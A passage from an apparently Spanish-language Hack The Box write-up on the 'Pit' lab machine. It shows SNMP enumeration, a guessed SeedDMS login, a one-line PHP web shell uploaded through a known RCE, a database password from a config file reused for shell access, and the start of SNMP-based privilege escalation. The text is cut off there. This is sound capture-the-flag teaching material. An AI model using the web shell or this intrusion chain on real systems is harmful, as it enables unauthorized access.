&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;c1&#34;&gt;#snmpwalk -v 2c -c public pit.htb .iso &amp;gt; out_snmp&lt;/span&gt;
 π ~/htb/pit ❯ snmpwalk -v 2c -c public pit.htb dskTable
UCD-SNMP-MIB::dskIndex.1 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; INTEGER: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
UCD-SNMP-MIB::dskIndex.2 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; INTEGER: &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;
UCD-SNMP-MIB::dskPath.1 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: /
UCD-SNMP-MIB::dskPath.2 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: /var/www/html/seeddms51x/seeddms
UCD-SNMP-MIB::dskDevice.1 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: /dev/mapper/cl-root
UCD-SNMP-MIB::dskDevice.2 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: /dev/mapper/cl-seeddms
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;... snip ...&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;

UCD-SNMP-MIB::dskErrorFlag.2 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; INTEGER: error&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
π ~/htb/pit ❯ snmpwalk -v 2c -c public pit.htb nsExtendObjects
NET-SNMP-EXTEND-MIB::nsExtendNumEntries.0 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; INTEGER: &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;
NET-SNMP-EXTEND-MIB::nsExtendCommand.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: /usr/bin/monitor
NET-SNMP-EXTEND-MIB::nsExtendArgs.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING:
NET-SNMP-EXTEND-MIB::nsExtendInput.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING:
NET-SNMP-EXTEND-MIB::nsExtendCacheTime.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; INTEGER: &lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;
NET-SNMP-EXTEND-MIB::nsExtendExecType.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; INTEGER: exec&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
NET-SNMP-EXTEND-MIB::nsExtendRunType.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; INTEGER: run-on-read&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
NET-SNMP-EXTEND-MIB::nsExtendStorage.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; INTEGER: permanent&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;4&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
NET-SNMP-EXTEND-MIB::nsExtendStatus.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; INTEGER: active&lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;1&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
NET-SNMP-EXTEND-MIB::nsExtendOutput1Line.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: Memory usage
NET-SNMP-EXTEND-MIB::nsExtendOutputFull.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: Memory usage
              total        used        free      shared  buff/cache   available
Mem:          3.8Gi       524Mi       3.0Gi       8.0Mi       303Mi       3.1Gi
Swap:         1.9Gi          0B       1.9Gi
Database status
OK - Connection to database successful.
System release info
CentOS Linux release 8.3.2011
SELinux Settings
user

                Labeling   MLS/       MLS/
SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles

guest_u         user       s0         s0                             guest_r
root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
user_u          user       s0         s0                             user_r
xguest_u        user       s0         s0                             xguest_r
login

Login Name           SELinux User         MLS/MCS Range        Service

__default__          unconfined_u         s0-s0:c0.c1023       *
michelle             user_u               s0                   *
root                 unconfined_u         s0-s0:c0.c1023       *
System uptime
 01:10:11 up  2:28,  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; users,  load average: 0.54, 0.56, 0.48
NET-SNMP-EXTEND-MIB::nsExtendOutNumLines.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; INTEGER: &lt;span class=&#34;m&#34;&gt;31&lt;/span&gt;
NET-SNMP-EXTEND-MIB::nsExtendResult.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; INTEGER: &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.1 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: Memory usage
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.2 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING:               total        used        free      shared  buff/cache   available
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.3 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: Mem:          3.8Gi       524Mi       3.0Gi       8.0Mi       303Mi       3.1Gi
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.4 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: Swap:         1.9Gi          0B       1.9Gi
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.5 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: Database status
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.6 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: OK - Connection to database successful.
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.7 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: System release info
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.8 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: CentOS Linux release 8.3.2011
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.9 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: SELinux Settings
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.10 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: user
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.11 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING:
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.12 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING:                 Labeling   MLS/       MLS/
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.13 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: SELinux User    Prefix     MCS Level  MCS Range                      SELinux Roles
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.14 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING:
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.15 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: guest_u         user       s0         s0                             guest_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.16 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: root            user       s0         s0-s0:c0.c1023                 staff_r sysadm_r system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.17 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: staff_u         user       s0         s0-s0:c0.c1023                 staff_r sysadm_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.18 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: sysadm_u        user       s0         s0-s0:c0.c1023                 sysadm_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.19 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: system_u        user       s0         s0-s0:c0.c1023                 system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.20 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: unconfined_u    user       s0         s0-s0:c0.c1023                 system_r unconfined_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.21 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: user_u          user       s0         s0                             user_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.22 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: xguest_u        user       s0         s0                             xguest_r
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.23 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: login
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.24 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING:
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.25 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: Login Name           SELinux User         MLS/MCS Range        Service
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.26 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING:
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.27 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: __default__          unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.28 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: michelle             user_u               s0                   *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.29 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: root                 unconfined_u         s0-s0:c0.c1023       *
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.30 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: System uptime
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.31 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING:  01:10:21 up  2:29,  &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; users,  load average: 0.53, 0.56, 0.48
NET-SNMP-EXTEND-MIB::nsExtendOutLine.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt;.31 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; No more variables left in this MIB View &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;It is past the end of the MIB tree&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h1 id=&#34;seeddms&#34;&gt;SeedDMS&lt;/h1&gt;
&lt;p&gt;En informacion del disco encontramos el directorio de lo que parece ser &lt;a href=&#34;https://www.seeddms.org/index.php?id=2&#34;&gt;SeedDMS&lt;/a&gt;, el nombre del directorio se utilizó para enumerar en los puertos http y los dominios.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;UCD-SNMP-MIB::dskPath.2 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: /var/www/html/seeddms51x/seeddms
UCD-SNMP-MIB::dskDevice.1 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: /dev/mapper/cl-root
UCD-SNMP-MIB::dskDevice.2 &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: /dev/mapper/cl-seeddms
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Encontramos el login de SeedDMS en &lt;code&gt;dms-pit.htb/seeddms51x/seeddms/&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pit/Screenshot_20210520_012827.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h2 id=&#34;note&#34;&gt;Note&lt;/h2&gt;
&lt;p&gt;Utilizamos un wordlist con todos los usuarios que encontramos (en SNMP) en el login, logramos ingresar utilizando &lt;code&gt;michelle:michelle&lt;/code&gt;. Dentro, encontramos un documento con una nota en la que indica que SeedDMS fue actualizado a una nueva version (5.1.15) ya que la version &lt;code&gt;5.1.11&lt;/code&gt; tendria multiples &amp;ldquo;problemas&amp;rdquo;, quizas relacionadas a vulnerabilidades (&lt;a href=&#34;https://www.exploit-db.com/exploits/47022&#34;&gt;1&lt;/a&gt;,&lt;a href=&#34;https://www.exploit-db.com/exploits/47023&#34;&gt;2&lt;/a&gt;,&lt;a href=&#34;https://www.exploit-db.com/exploits/47024&#34;&gt;3&lt;/a&gt;), aunque SeedDMS no indica la version actual en ninguna parte de la plataforma, además encontramos el nombre de usuarios.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pit/Screenshot_20210524_175007.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;6
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;Administrator &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;admin&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
admin@pit.htb
Jack &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;jack&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
jack@dms-pit.htb
Michelle &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;michelle&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
michelle@pit.htb
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;webshell&#34;&gt;WebShell&lt;/h2&gt;
&lt;p&gt;Al no indicar la version en la plataforma y solamente mencionarse en el documento (CHANGELOG), realizamos la explotacion segun los pasos del &lt;a href=&#34;https://www.exploit-db.com/exploits/47022&#34;&gt;exploit RCE&lt;/a&gt;, con el cual logramos ejecutar comandos.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php&#34; data-lang=&#34;php&#34;&gt;&lt;span class=&#34;o&#34;&gt;&amp;lt;?&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;system&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_GET&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;cmd&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]));&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;err&#34;&gt;
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pit/Screenshot_20210524_183902.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;user---michelle&#34;&gt;User - Michelle&lt;/h1&gt;
&lt;p&gt;Se realizó una enumeracion utilizando la &amp;ldquo;webshell&amp;rdquo;, encontramos en los archivos de configuracion de SeedDMS (&lt;code&gt;/var/www/html/seeddms51x/conf/settings.xml&lt;/code&gt;) las credenciales de la base de datos de mysql.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt; &amp;lt;database &lt;span class=&#34;nv&#34;&gt;dbDriver&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;mysql&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;dbHostname&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;localhost&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;dbDatabase&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;seeddms&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;dbUser&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;seeddms&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;dbPass&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;ied^ieY6xoquu&amp;#34;&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;doNotCheckVersion&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;false&amp;#34;&lt;/span&gt;&amp;gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;h2 id=&#34;cockpit---shell&#34;&gt;Cockpit - Shell&lt;/h2&gt;
&lt;p&gt;Utilizamos la contraseña y usuario &lt;code&gt;michelle&lt;/code&gt; en cockpit, logramos obtener acceso, una shell y la flag &lt;code&gt;user.txt&lt;/code&gt;.&lt;br /&gt;
&lt;img src=&#34;https://sckull.github.io/images/posts/htb/pit/Screenshot_20210525_115108.png&#34; alt=&#34;image&#34; /&gt;&lt;/p&gt;
&lt;h1 id=&#34;snmp--root&#34;&gt;Snmp &amp;gt; Root&lt;/h1&gt;
&lt;p&gt;En el servicio SNMP encontramos informacion acerca de un comando con &lt;code&gt;nsExtendCommand&lt;/code&gt;, ademas informacion (&lt;a href=&#34;https://rioasmara.com/2021/02/05/snmp-arbitary-command-execution-and-shell/&#34;&gt;1&lt;/a&gt;, &lt;a href=&#34;https://mogwailabs.de/en/blog/2019/10/abusing-linux-snmp-for-rce/&#34;&gt;2&lt;/a&gt;) para ejecucion de comandos, sin embargo no funcionó en el comando &lt;code&gt;monitor&lt;/code&gt;.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;π ~/htb/pit ❯ snmpwalk -v 2c -c public pit.htb nsExtendCommand
NET-SNMP-EXTEND-MIB::nsExtendCommand.&lt;span class=&#34;s2&#34;&gt;&amp;#34;monitoring&amp;#34;&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; STRING: /usr/bin/monitor
 π ~/htb/pit ❯
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;Verificamos el comando y vemos que realiza la ejecucion de scripts dentro de la carpeta &lt;code&gt;/usr/local/monitoring/&lt;/code&gt;, el cual tiene &lt;a href=&#34;https://superuser.com/a/197754&#34;&gt;permisos de acceso&lt;/a&gt;, verificamos la carpeta con &lt;code&gt;getfacl&lt;/code&gt; y vemos que michelle tiene permisos de escritura y ejecucion.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt; 1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;25
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;michelle@pit ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ file /usr/bin/monitor
/usr/bin/monitor: Bourne-Again shell script, ASCII text executable
&lt;span class=&#34;o&#34;&gt;[&lt;/span&gt;michelle@pit ~&lt;span class=&#34;o&#34;&gt;]&lt;/span&gt;$ cat /usr/bin/monitor
&lt;span class=&#34;c1&#34;&gt;#!/bin/bash&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;for&lt;/span&gt; script in /usr/local/monitoring/check*sh
